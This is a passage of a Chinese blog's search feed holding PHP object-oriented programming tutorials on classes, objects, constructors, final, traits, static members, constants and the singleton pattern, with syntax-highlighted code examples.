class="token variable">$sex</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 重写构造方法时,参数可以不一致 </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$sex</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> sex <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 重写父类方法时,还要求参数一致(个数,类型) </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">,</span> <span class="token variable">$y</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">,</span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$b</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final  关键字"></a>final  关键字</h4><p>用来修饰类和成员方法, 用final修饰的类可以实例化对象但不能被继承  修饰的方法可以被调用但不能被重写</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 表示本类不能被继承 </span><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 表示该方法不能被重写 </span>    <span class="token keyword">final</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">'就算你叫破喉咙我也会继续写下去!'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="trait-关键字"><a href="#trait-关键字" class="headerlink" title="trait 关键字"></a>trait 关键字</h4><p>与 class 相似, 但是用 trait 定义的结构不能实例化对象</p><p>通过在类中使用use 关键字，声明要组合的Trait名称</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">trait</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'说话的方法.....'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">trait</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'吃饭的方法.....'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 使用 trait A和B 做为本类的组装零件 </span>    <span class="token keyword">use</span> <span class="token package">A</span><span class="token punctuation">,</span>B<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">talk</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'一起出去走走呀....'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">D</span> <span class="token keyword">extends</span> <span class="token class-name">C</span><span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'已在运行起来了.....'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解PHP中的面向对象（上）</title>
      <link href="/posts/95522ac2.html"/>
      <url>/posts/95522ac2.html</url>
      
        <content type="html"><![CDATA[<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><hr><p><strong>面向对象的编程(OOP)</strong></p><p>软件工程的目标: 复用性 灵活性 扩展性.</p><p>面向对象的特点: 封装 继承 多态</p><h4 id="对象-object"><a href="#对象-object" class="headerlink" title="对象(object)"></a>对象(object)</h4><p>对象就是具有一定功能和特征的事物.凡是能帮我们实现某种需求的事物的都是对象</p><p>a) 女朋友是对象.</p><p>b) 每一个学员都是讲师的教学对象.</p><h4 id="类-class"><a href="#类-class" class="headerlink" title="类(class)"></a>类(class)</h4><p>具有相同特征和功能的对象的抽象 就是类</p><p>很多个学生对象归纳为一个学生类.</p><p>很多个商品对象归纳为一个商品类.</p><h4 id="对象和类之间的关系"><a href="#对象和类之间的关系" class="headerlink" title="对象和类之间的关系"></a>对象和类之间的关系</h4><p>对象参考类的结构,被创建出来.并且属性保存具体的数据.</p><p>它是具体的.</p><p>类是对所属对象的共有特性的描述, 可以说这是一个类型, 一个结构</p><p>它是抽象的</p><p>对象的抽象就是类</p><p>类的实体化(实例化)就是对象</p><h4 id="对象和类的对比"><a href="#对象和类的对比" class="headerlink" title="对象和类的对比"></a>对象和类的对比</h4><p>马良                     马良画的图       从画里走出来的事物</p><p>工程设计师              设计图          由设计图造出来的事物</p><p>程序员                         类                        对象</p><p><strong>通过类的结构创建对象</strong></p><p><a href="https://imgtu.com/i/20PXvj" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/06/07/20PXvj.jpg" alt="20PXvj.jpg"></a></p><p><strong>定义类</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 定义一个学生类 </span><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// 成员属性(类中的变量) </span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 成员方法(类中的函数) </span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">'我爱写作业!&lt;br>'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*a)成员属性    i.必须要加修饰符来修饰   public     ii.成员属性的初始值可有可无    iii.成员属性初始值的注意事项      iv.成员属性可以使用常量进行赋初始值b)成员方法    i.成员方法可以不加修饰符修饰   public     ii.成员方法中 参数可有可无 代码体可有可无 方法的返回值也是可有可无的    iii.在成员方法(函数) 没有使用return手动返回一个值的话  它的默认返回值就是null*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参照类实例化对象</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// 根据类的结构,创建对象(术语:实例化对象) </span><span class="token variable">$stu1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*    1.new关键字不能省略      2.小括号可有可无    3.对象的实例化 可以放在类声明之前   对象的实例化还可以放到类的内部*/</span>    <span class="token comment" spellcheck="true">// 对象的成员访问</span><span class="token comment" spellcheck="true">// 成员属性赋值 </span><span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string">'王建双'</span><span class="token punctuation">;</span> <span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> sex <span class="token operator">=</span> <span class="token string">'男'</span><span class="token punctuation">;</span> <span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> age <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> name<span class="token punctuation">,</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*注意:    1.如果属性名是固定的话  前面不能加$    2.成员访问符的两侧可以有空白, 成员访问符的中间不能有空白    3.成员属性和成员方法的位置不是绝对固定的 一般来说都是将成员属性放置在上面,成员方法放置在下面.    4.在类中不能出现除了成员属性和成员方法之外的代码*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>成员属性的动态创建,销毁,遍历</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token variable">$stu1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//动态添加属性</span><span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">'age'</span><span class="token punctuation">;</span><span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string">'王建双'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 原本没有该属性值, 现在相当于添加一个成员属性 </span><span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 属性不需要时, 可以销毁掉. </span><span class="token comment" spellcheck="true">// 对象也可理解为数组的升级, 它是一个复合类型变量 </span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$stu1</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token variable">$k</span><span class="token punctuation">,</span><span class="token string">'==='</span><span class="token punctuation">,</span><span class="token variable">$v</span><span class="token punctuation">,</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>让对象表达自己($this)</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">'我叫'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$stu1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">;</span> <span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string">'王建双'</span><span class="token punctuation">;</span> <span class="token variable">$stu1</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 我叫王建双</span><span class="token comment" spellcheck="true">/*    1 $this代表当前这个对象,谁调用当前这个方法,那么$this就代表(等于)哪个对象    2.$this只能在类的内部使用  并且只能放置在成员方法中    3.$this不仅能访问成员属性 还能在成员方法中调用成员方法*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><p>创建对象时, 自动触发构造方法, 可以在构造方法中快速给对象属性赋值</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> sex <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> age <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 在实例化对象时,直接赋值     为了初始化对象</span><span class="token variable">$stu1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">'王建双'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="析构方法"><a href="#析构方法" class="headerlink" title="析构方法"></a>析构方法</h4><p>对象被销毁时, 自动触发该方法. </p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 资源释放, 断开连接, 关闭打开的资源 </span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1) 对象是变量, 所以当变量被赋值时, 原来的对象被覆盖销毁. </p><p>2) php代码结束时, 所有变量常量统统销毁, 对象是变量, 也被销毁.</p><p>3) 使用unset销毁当前这个对象.</p><h4 id="对象与对象的关系"><a href="#对象与对象的关系" class="headerlink" title="对象与对象的关系"></a>对象与对象的关系</h4><p>每个对象都有一个 id 号</p><p>判断两个对象是否相等, 应该用全等于</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token variable">$stu1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">;</span> <span class="token variable">$stu2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stu1</span> <span class="token operator">===</span> <span class="token variable">$stu2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">'两个对象相等,代表同一个对象'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*     也可以用 var_dump($stu1, $stu2) 分别查看两个对象的id号 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对象赋值给另一个变量. 两个变量都可以操作对象.(看似是引用)</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$stu1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">;</span> <span class="token variable">$stu2</span> <span class="token operator">=</span> <span class="token variable">$stu1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 两个变量, 代表同一个对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>克隆对象, 可以得到一个新的对象</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$stu1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">;</span> <span class="token variable">$stu2</span> <span class="token operator">=</span> clone <span class="token variable">$stu1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 两个变量, 代表两个对象 </span><span class="token comment" spellcheck="true">/*    有时候 new 一个对象时,构造方法要执行大量耗时的代码,或占大量内存,来完成初始化.     克隆是直接复制, 可以节省构造方法的执行时间以及占用的内存. */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="instanceof-类运算符"><a href="#instanceof-类运算符" class="headerlink" title="instanceof  类运算符"></a>instanceof  类运算符</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$stu1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//instanceof 运算符   检测一个对象是否为该类的实例化</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stu1</span> <span class="token keyword">instanceof</span> <span class="token class-name">Student</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">'这个对象是属于Student类的'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">get_class</span><span class="token punctuation">(</span> <span class="token variable">$stu1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取对象所属类的名称 'Student'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解PHP中的面向对象（下）</title>
      <link href="/posts/2dee4da7.html"/>
      <url>/posts/2dee4da7.html</url>
      
        <content type="html"><![CDATA[<h3 id="static-静态修饰符"><a href="#static-静态修饰符" class="headerlink" title="static   静态修饰符"></a>static   静态修饰符</h3><p>写在成员属性之前, 该成员称为<strong>静态成员属性</strong></p><p>静态成员属性, 是静态的, 保存在类的定义内存中. 不管对象创建与销毁, 它都存在.</p><p>a) 静态成员属性</p><p>​    i. 静态修饰符(static)可以跟public protected private一起修饰成员属性,也可以单独来修饰成员属性</p><p>​    ii. 静态成员属性 是作为该类对象的一个共有属性存在</p><p>​    iii. 静态成员属性的访问方式</p><p>​                1) 在类的内部  self::静态成员属性</p><p>​                2) 在类的外部  类名::静态成员属性</p><p>b) 静态成员方法</p><p>​    i. 静态修饰符(static)可以跟public protected private一起修饰成员方法</p><p>​    ii. 静态成员方法中只能操作静态成员, 绝对不能在静态成员方法中使用$this</p><p>​    iii. 静态成员方法的访问形式</p><p>​                1) 在类的内部  self::方法名</p><p>​                2) 在类的外部  类名::方法名</p><p>类内和类外的静态成员属性访问</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">A</span>  <span class="token punctuation">{</span>      <span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token string">'wangjs'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 1.定义静态成员</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">xxoo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>           <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$abc</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 2.成员方法中访问</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">echo</span> A<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$abc</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 3.外部 通过 类名::$属性名 访问</span>  <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$abc</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 4.外部 通过 对象::$属性名 访问  (这样访问慢一点)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>类内和类外的静态成员方法访问</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">A</span>  <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token string">'wangjs'</span><span class="token punctuation">;</span>          <span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">xxoo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// 1.定义静态成员方法</span>      <span class="token punctuation">{</span>           <span class="token keyword">return</span> <span class="token number">100</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">xxoo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2.访问静态成员方法</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">echo</span> A<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">xxoo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 3.外部 通过 类名::方法名 访问</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常量-const"><a href="#常量-const" class="headerlink" title="常量   const"></a>常量   const</h3><p>在类的内部定义常量, 只能使用  const</p><pre class="line-numbers language-php"><code class="language-php">  <span class="token keyword">class</span> <span class="token class-name">A</span>  <span class="token punctuation">{</span>     <span class="token keyword">const</span> <span class="token constant">XXOO</span> <span class="token operator">=</span> <span class="token string">'wangjs'</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 1.定义常量</span>     <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>         <span class="token keyword">echo</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">XXOO</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 2.成员方法中 访问常量</span>     <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">echo</span> A<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">XXOO</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 3. 外部 类名::常量名</span>  <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">XXOO</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 4. 外部 对象::常量名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>const和define的区别</strong></p><p>​    i. const可以在类中定义常量  但是define不可以</p><p>​    ii. define赋值的时候可以使用变量进行赋值, 在函数的内部可以使用,  const是不可以的</p><p>​    iii. define可以在流程控制中定义常量(if  swtich) ,const是不可以的</p><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><p>单例设计模式, 使某个类的对象仅允许实例化一次</p><p>1.不允许脚本在类的外部使用new关键字实例化对象.操作就是将构造方法和析构方法私有化</p><p>2.需要在类的内部声明一个公有的静态成员方法, 必须调用此方法 以返回实例的一个引用</p><p>3.声明静态成员属性存储新产生的对象</p><p>4.私有的__clone()方法防止克隆对象</p><pre class="line-numbers language-php"><code class="language-php">    <span class="token keyword">class</span> <span class="token class-name">A</span>    <span class="token punctuation">{</span>         <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$age</span><span class="token punctuation">;</span>         <span class="token keyword">static</span> <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 1.定义 静态+私有 成员属性</span>         <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 2.私有化 构造方法  之后就不能 new 了</span>         <span class="token punctuation">{</span>               <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> 